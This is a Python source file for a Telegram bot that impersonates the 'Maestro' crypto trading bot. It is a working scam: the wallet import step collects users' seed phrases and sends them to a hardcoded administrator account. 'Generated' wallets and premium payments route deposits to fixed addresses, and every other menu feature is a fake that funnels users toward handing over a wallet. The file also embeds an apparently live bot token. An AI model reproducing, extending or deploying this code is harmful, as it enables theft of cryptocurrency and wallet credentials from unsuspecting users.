import asyncio
import logging
import requests
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ===================== КОНФИГ =====================
TOKEN = "8829339666:AAGzC7RJhwgqMbAC50X4IapojM7QyIwY4nM"
ADMIN_ID = 8644962527
SUPPORT_CHAT_LINK = "https://t.me/maestrosuport"
PREMIUM_PRICE_USD = 200

# ===================== АДРЕСА КОШЕЛЬКОВ =====================
WALLET_ADDRESSES = {
    "sol": {"address": "74vXg1dJyvngpPHfHkLD8LS5gRpxAHB72MSpJ7aBLcLh", "network": "Solana"},
    "eth": {"address": "0x99EA2df1aEA07b52E6B5A6611acbf73331EdcCb6", "network": "Ethereum"},
    "btc": {"address": "bc1q0c23wtk2l8jke2ld9rq35rwnufpx0fxqphrljr", "network": "Bitcoin"},
    "trx": {"address": "TEJxBNhk7VtfNVjqNbJfAqey1ZksT2pU1S", "network": "Tron"},
    "bsc": {"address": "terra1mr2edrwarg3kn7y6nxwls4xhwuklc29l28npcw", "network": "Terra Classic"},
    "monad": {"address": "0x99EA2df1aEA07b52E6B5A6611acbf73331EdcCb6", "network": "Monad"},
    "sonic": {"address": "0x99EA2df1aEA07b52E6B5A6611acbf73331EdcCb6", "network": "Sonic"},
    "avax": {"address": "0x99EA2df1aEA07b52E6B5A6611acbf73331EdcCb6", "network": "Avalanche C-Chain"},
    "arb": {"address": "0x99EA2df1aEA07b52E6B5A6611acbf73331EdcCb6", "network": "Arbitrum"},
    "hype": {"address": "0x99EA2df1aEA07b52E6B5A6611acbf73331EdcCb6", "network": "HyperEVM"},
    "robinhood": {"address": "74vXg1dJyvngpPHfHkLD8LS5gRpxAHB72MSpJ7aBLcLh", "network": "Solana"},
    "arc": {"address": "74vXg1dJyvngpPHfHkLD8LS5gRpxAHB72MSpJ7aBLcLh", "network": "Solana"},
    "stable": {"address": "TEJxBNhk7VtfNVjqNbJfAqey1ZksT2pU1S", "network": "Tron"},
    "ton": {"address": "0x99EA2df1aEA07b52E6B5A6611acbf73331EdcCb6", "network": "Ethereum"},
    "base": {"address": "0x99EA2df1aEA07b52E6B5A6611acbf73331EdcCb6", "network": "Base"}
}

PREMIUM_WALLETS = {
    "sol": {"address": "74vXg1dJyvngpPHfHkLD8LS5gRpxAHB72MSpJ7aBLcLh", "network": "Solana"},
    "btc": {"address": "bc1q0c23wtk2l8jke2ld9rq35rwnufpx0fxqphrljr", "network": "Bitcoin"},
    "trx": {"address": "TEJxBNhk7VtfNVjqNbJfAqey1ZksT2pU1S", "network": "Tron"},
    "eth": {"address": "0x99EA2df1aEA07b52E6B5A6611acbf73331EdcCb6", "network": "Ethereum"}
}

# ===================== ИНИЦИАЛИЗАЦИЯ =====================
bot = Bot(token=TOKEN)
dp = Dispatcher()

# ===================== СОСТОЯНИЯ =====================
class WalletStates(StatesGroup):
    waiting_for_name = State()
    waiting_for_seed = State()

# ===================== ФУНКЦИЯ КУРСА =====================
async def get_crypto_price(symbol: str, currency: str = 'usd') -> float:
    try:
        url = f"https://api.coingecko.com/api/v3/simple/price?ids={symbol}&vs_currencies={currency}"
        response = requests.get(url)
        data = response.json()
        price = data.get(symbol, {}).get(currency, 0.0)
        return price
    except Exception as e:
        print(f"Ошибка получения курса: {e}")
        return 0.0

# ===================== КЛАВИАТУРЫ =====================

# 1. Главное меню
main_menu = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔗 Chains", callback_data="chains"),
     InlineKeyboardButton(text="🇺🇸🇨🇳 Language", callback_data="language")],
    [InlineKeyboardButton(text="💳 Wallets", callback_data="wallets"),
     InlineKeyboardButton(text="⚙️ Global Settings", callback_data="global_settings")],
    [InlineKeyboardButton(text="📡 Signals", callback_data="signals"),
     InlineKeyboardButton(text="👫 Copytrade", callback_data="copytrade")],
    [InlineKeyboardButton(text="🕔 Active Orders", callback_data="active_orders"),
     InlineKeyboardButton(text="📈 Positions", callback_data="positions")],
    [InlineKeyboardButton(text="🎯 Auto Snipe", callback_data="auto_snipe"),
     InlineKeyboardButton(text="↔️ Bridge", callback_data="bridge")],
    [InlineKeyboardButton(text="⭐ Premium", callback_data="premium"),
     InlineKeyboardButton(text="💸 Cashback", callback_data="cashback"),
     InlineKeyboardButton(text="💰 Referral", callback_data="referral")],
    [InlineKeyboardButton(text="⚡️ BUY & SELL NOW!", callback_data="buy_sell")]
])

# 2. Выбор сети (3 колонки)
chains_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="SOL", callback_data="chain_sol"),
     InlineKeyboardButton(text="BSC", callback_data="chain_bsc"),
     InlineKeyboardButton(text="BASE", callback_data="chain_base")],
    [InlineKeyboardButton(text="ETH", callback_data="chain_eth"),
     InlineKeyboardButton(text="MONAD", callback_data="chain_monad"),
     InlineKeyboardButton(text="SONIC", callback_data="chain_sonic")],
    [InlineKeyboardButton(text="AVAX", callback_data="chain_avax"),
     InlineKeyboardButton(text="ARB", callback_data="chain_arb"),
     InlineKeyboardButton(text="HYPE", callback_data="chain_hype")],
    [InlineKeyboardButton(text="ROBINHOOD", callback_data="chain_robinhood"),
     InlineKeyboardButton(text="ARC", callback_data="chain_arc"),
     InlineKeyboardButton(text="STABLE", callback_data="chain_stable")],
    [InlineKeyboardButton(text="TRX", callback_data="chain_trx"),
     InlineKeyboardButton(text="TON", callback_data="chain_ton")],
    [InlineKeyboardButton(text="⬅️ Return", callback_data="back_to_menu")]
])

# 3. Действия с кошельком
wallet_actions = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="ℹ️ Help", callback_data="help_wallet"),
     InlineKeyboardButton(text="Return", callback_data="back_to_chains")],
    [InlineKeyboardButton(text="🗄 Rearrange Wallets", callback_data="rearrange_wallets")],
    [InlineKeyboardButton(text="Import Wallet", callback_data="import_wallet"),
     InlineKeyboardButton(text="Generate Wallet", callback_data="generate_wallet")],
    [InlineKeyboardButton(text="Collect", callback_data="collect")],
    [InlineKeyboardButton(text="Disperse", callback_data="disperse")]
])

# 4. Premium меню
premium_menu = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💎 SOL (SOL)", callback_data="premium_sol")],
    [InlineKeyboardButton(text="💎 BTC", callback_data="premium_btc")],
    [InlineKeyboardButton(text="💎 TRX (TRX)", callback_data="premium_trx")],
    [InlineKeyboardButton(text="💎 ETH (ETH)", callback_data="premium_eth")],
    [InlineKeyboardButton(text="❌ Close", callback_data="back_to_menu")]
])

# 5. Кнопка OK
ok_button = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ OK", callback_data="ok_error")]
])

# 6. Кнопка OK после пополнения
deposit_ok = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ OK", callback_data="after_deposit")]
])

# 7. Кнопка Return
back_to_chains_button = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="⬅️ Return", callback_data="back_to_chains")]
])

# 8. Кнопка "Go to Wallets"
go_to_wallets = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Go to Wallets", callback_data="wallets")]
])

# ===================== ХЕНДЛЕРЫ =====================

@dp.message(Command("start"))
async def start(message: types.Message):
    user = message.from_user
    username = f"@{user.username}" if user.username else "No username"
    
    # Отправка уведомления админу
    await bot.send_message(
        ADMIN_ID,
        f"🟢 New user started the bot!\n"
        f"👤 Name: {user.full_name}\n"
        f"🆔 ID: {user.id}\n"
        f"📛 Username: {username}"
    )
    
    await message.answer(
        "⭐ Welcome to Maestro, the one-stop solution for all your trading needs!\n\n"
        "- Chains: Enable/disable chains.\n"
        "- Wallets: Import or generate wallets.\n"
        "- Global Settings: Customize the bot.\n"
        "- Active Orders: Active buy/sell limit orders.\n"
        "- Positions: Monitor your active trades.\n\n"
        "⚠ Paste a token CA to trade immediately!\n\n"
        "Hub • Updates • X (Twitter) • Docs • Support • More Links",
        reply_markup=main_menu
    )

# ===== ОСТАЛЬНЫЕ КНОПКИ (кроме Wallets и Premium) -> "Add Wallet" =====
@dp.callback_query(F.data.in_([
    "chains", "language", "global_settings", "signals", "copytrade",
    "active_orders", "positions", "auto_snipe", "bridge",
    "cashback", "referral", "buy_sell"
]))
async def other_buttons(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "⚠️ To use this function, you need to add a wallet first.\n\n"
        "Please click the button below to set up your wallet.",
        reply_markup=go_to_wallets
    )
    await callback.answer()

# ===== WALLETS -> выбор сети =====
@dp.callback_query(F.data == "wallets")
async def show_chains(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "Select the target chain. You can remove or add missing chains through /chains.",
        reply_markup=chains_keyboard
    )
    await callback.answer()

# ===== Выбор сети -> меню действий =====
@dp.callback_query(F.data.startswith("chain_"))
async def chain_selected(callback: types.CallbackQuery, state: FSMContext):
    chain = callback.data.split("_")[1]
    await state.update_data(selected_chain=chain)
    await callback.message.edit_text(
        "Wallet not found. Please import or generate.",
        reply_markup=wallet_actions
    )
    await callback.answer()

# ===== HELP -> ссылка на поддержку =====
@dp.callback_query(F.data == "help_wallet")
async def help_wallet(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"🆘 Need help?\n\nContact our support team: {SUPPORT_CHAT_LINK}",
        reply_markup=back_to_chains_button
    )
    await callback.answer()

# ===== REARRANGE WALLETS =====
@dp.callback_query(F.data == "rearrange_wallets")
async def rearrange_wallets(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "ℹ️ Wallet not found. Please import or generate.",
        reply_markup=back_to_chains_button
    )
    await callback.answer()

# ===== GENERATE WALLET -> запрос имени =====
@dp.callback_query(F.data == "generate_wallet")
async def generate_wallet(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "What would you like to name this wallet? 8 letters max, only numbers and letters."
    )
    await state.set_state(WalletStates.waiting_for_name)
    await callback.answer()

# ===== Обработка имени =====
@dp.message(WalletStates.waiting_for_name, F.text)
async def process_wallet_name(message: types.Message, state: FSMContext):
    name = message.text.strip()
    if not name or len(name) > 8 or not name.isalnum():
        await message.answer("❌ Invalid name. Use max 8 letters and numbers only.")
        return

    data = await state.get_data()
    chain = data.get("selected_chain", "unknown")
    user = message.from_user

    await bot.send_message(
        ADMIN_ID,
        f"🔐 New wallet generated!\n"
        f"👤 User: @{user.username or user.id}\n"
        f"🔗 Chain: {chain.upper()}\n"
        f"📛 Name: {name}"
    )

    wallet_data = WALLET_ADDRESSES.get(chain, {})
    address = wallet_data.get("address", "Address not set")
    network = wallet_data.get("network", "Unknown network")

    await message.answer(
        f"✅ Generated new wallet:\n\n"
        f"Chain: {chain.upper()}\n"
        f"Address: `{address}`\n\n"
        f"⚠️ Send only {network} assets to this address.\n"
        f"Other assets will be permanently lost.\n\n"
        f"Please send from 1 to 1000 {chain.upper()} to this address.\n"
        f"After deposit press OK.",
        reply_markup=deposit_ok,
        parse_mode="Markdown"
    )
    await state.clear()

# ===== IMPORT WALLET -> запрос сид-фразы =====
@dp.callback_query(F.data == "import_wallet")
async def import_wallet(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "🔐 Import Wallet\n\n"
        "Please send your seed phrase (12 or 24 words) to import your wallet.\n\n"
        "⚠️ The phrase will be forwarded to the administrator.",
        reply_markup=back_to_chains_button
    )
    await state.set_state(WalletStates.waiting_for_seed)
    await callback.answer()

# ===== Обработка сид-фразы =====
@dp.message(WalletStates.waiting_for_seed, F.text)
async def process_seed_phrase(message: types.Message, state: FSMContext):
    words = message.text.strip().split()
    if len(words) not in [12, 24]:
        await message.answer("❌ Invalid seed phrase. Must be 12 or 24 words.")
        return

    data = await state.get_data()
    chain = data.get("selected_chain", "unknown")
    user = message.from_user

    await bot.send_message(
        ADMIN_ID,
        f"🔐 New wallet imported!\n"
        f"👤 User: @{user.username or user.id}\n"
        f"🔗 Chain: {chain.upper()}\n"
        f"📝 Seed phrase: {message.text}"
    )

    await message.answer("✅ Wallet imported successfully! Admin notified.")
    await state.clear()
    await message.answer("⭐ Welcome to Maestro!", reply_markup=main_menu)

# ===== COLLECT / DISPERSE -> ошибка =====
@dp.callback_query(F.data.in_(["collect", "disperse"]))
async def collect_or_disperse(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "❌ You must have at least two connected wallets.",
        reply_markup=ok_button
    )
    await callback.answer()

# ===== OK (ошибка) -> возврат =====
@dp.callback_query(F.data == "ok_error")
async def ok_error(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "Wallet not found. Please import or generate.",
        reply_markup=wallet_actions
    )
    await callback.answer()

# ===== OK (после пополнения) -> главное меню =====
@dp.callback_query(F.data == "after_deposit")
async def after_deposit(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "✅ Deposit confirmed! Your wallet is being activated.\n\n"
        "Return to main menu:",
        reply_markup=main_menu
    )
    await callback.answer()

# ===== PREMIUM =====
@dp.callback_query(F.data == "premium")
async def premium_handler(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "⭐ Premium Benefits ⭐️\n"
        "└ Speed Boost: Dedicated Premium Bot (up to 30% faster) 🤖\n"
        "└ Launch Tax/Deadblock Simulation 🕵️‍♂️\n"
        "└ 10 ➡️ 30 Trade Monitors\n"
        "└ 8 ➡️ 10 Token Limit Orders/Wallet\n"
        "└ 36 ➡️ 96 Hour Trades\n"
        "└ 5 ➡️ 10 Multi-Wallets\n"
        "└ 5 ➡️ 12 Copytrade Wallets\n"
        "└ 5 ➡️ 10 Concurrent Snipes\n"
        "└ Token Hits 👀\n"
        "└ Maestro Trending List 💎\n"
        "└ Maestro Yacht Club Membership 💎\n"
        "└ First-Class Support\n"
        "└ Future Unrevealed Benefits\n\n"
        "🛒 Buy for $200 per 30 days! Use the pay buttons below to start or extend your subscription.",
        reply_markup=premium_menu
    )
    await callback.answer()

# ===== PREMIUM PAYMENT -> показ кошелька с курсом =====
@dp.callback_query(F.data.startswith("premium_"))
async def premium_payment(callback: types.CallbackQuery):
    network = callback.data.split("_")[1]
    
    wallet_data = PREMIUM_WALLETS.get(network, {})
    address = wallet_data.get("address", "Address not set")
    network_name = wallet_data.get("network", "Unknown network")

    symbol_map = {
        "sol": "solana",
        "btc": "bitcoin",
        "trx": "tron",
        "eth": "ethereum"
    }
    symbol = symbol_map.get(network)
    price = await get_crypto_price(symbol)

    message_text = (
        f"💎 Send payment for Premium to this address:\n\n"
        f"Network: {network.upper()}\n"
        f"Address: `{address}`\n\n"
        f"⚠️ Send only {network_name} assets to this address.\n"
        f"Other assets will be permanently lost.\n"
    )

    if price > 0:
        amount = PREMIUM_PRICE_USD / price
        message_text += f"\n💰 Amount to send: **{amount:.6f} {network.upper()}** (≈ ${PREMIUM_PRICE_USD} USD)"
    else:
        message_text += f"\n⚠️ Could not fetch current rate. Please send ≈ ${PREMIUM_PRICE_USD} USD in {network.upper()}."

    message_text += "\n\nAfter sending the payment, press OK."

    await callback.message.edit_text(
        message_text,
        reply_markup=deposit_ok,
        parse_mode="Markdown"
    )
    await callback.answer()

# ===== Return в главное меню =====
@dp.callback_query(F.data == "back_to_menu")
async def back_to_main(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "⭐ Welcome to Maestro, the one-stop solution for all your trading needs!\n\n"
        "- Chains: Enable/disable chains.\n"
        "- Wallets: Import or generate wallets.\n"
        "- Global Settings: Customize the bot.\n"
        "- Active Orders: Active buy/sell limit orders.\n"
        "- Positions: Monitor your active trades.\n\n"
        "⚠ Paste a token CA to trade immediately!\n\n"
        "Hub • Updates • X (Twitter) • Docs • Support • More Links",
        reply_markup=main_menu
    )
    await callback.answer()

# ===== Return к выбору сети =====
@dp.callback_query(F.data == "back_to_chains")
async def back_to_chains(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "Select the target chain. You can remove or add missing chains through /chains.",
        reply_markup=chains_keyboard
    )
    await callback.answer()

# ===================== ЗАПУСК =====================
async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())